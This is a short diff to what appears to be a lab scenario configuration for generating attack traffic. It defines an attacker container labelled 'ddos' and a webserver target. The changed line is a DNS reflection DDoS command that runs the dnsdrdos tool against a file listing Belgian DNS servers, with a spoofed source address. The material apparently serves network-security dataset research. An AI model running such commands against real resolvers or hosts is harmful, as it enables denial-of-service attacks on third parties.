@@ -4,7 +4,7 @@ attacker:
   category: ddos
   name: dnsdrdos
   image: gitlab.ilabt.imec.be:4567/lpdhooge/containercap-imagery/dns-drdos:latest
-  atkCommand: timeout 5m for i in `seq 1 1000`; do ./dnsdrdos -f DNS_server_list/DNS_server_list_BE.txt -s 127.0.0.1 -d $i -l 10000; done
+  atkCommand: timeout 5m ./dnsdrdos -f DNS_server_list/DNS_server_list_BE.txt -s 127.0.0.1 -l 1000000
 
 target:
   category: webserver
